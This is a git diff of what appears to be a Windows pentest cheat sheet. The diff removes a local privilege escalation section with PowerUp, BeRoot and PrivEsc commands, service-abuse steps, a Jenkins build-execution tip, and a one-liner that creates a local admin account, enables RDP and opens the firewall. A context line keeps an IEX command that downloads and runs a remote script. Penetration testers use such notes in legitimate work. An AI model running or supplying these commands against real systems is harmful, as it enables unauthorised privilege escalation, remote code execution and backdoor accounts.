@@ -87,51 +87,6 @@ $r = $wr.GetResponse()
 IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 ```
 
-# Local privilege escalation
-Focussing on Service issues
-#### Privesc check all
-https://github.com/enjoiz/Privesc
-```
-. .\privesc.ps1
-Invoke-PrivEsc
-```
-
-#### Beroot check all
-https://github.com/AlessandroZ/BeRoot
-```
-./beRoot.exe
-```
-
-####  Run powerup check all
-https://github.com/HarmJ0y/PowerUp
-```
-. ./powerup
-Invoke-allchecks
-```
-
-####  Run powerup get services with unqouted paths and a space in their name
-```
-Get-ServiceUnquoted -Verbose
-Get-ModifiableServiceFile -Verbose
-```
-
-####  Abuse service to get local admin permissions with powerup
-```
-Invoke-ServiceAbuse
-Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<username>'
-```
-
-####  Jekins
-```
-Runs as local admin, go to /job/project/configure to try to see if you have build permissions in /job/project0/configure
-Execute windows or shell comand into the build, you can also use powershell scripts
-```
-
-### Add user to local admin and RDP group and enable RDP on firewall
-```
-net user <username> <password> /add /Y   && net localgroup administrators <username> /add   && net localgroup "Remote Desktop Users" <username> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
-```
-
 # Lateral Movement
 ## General
 #### Connect to machine with administrator privs
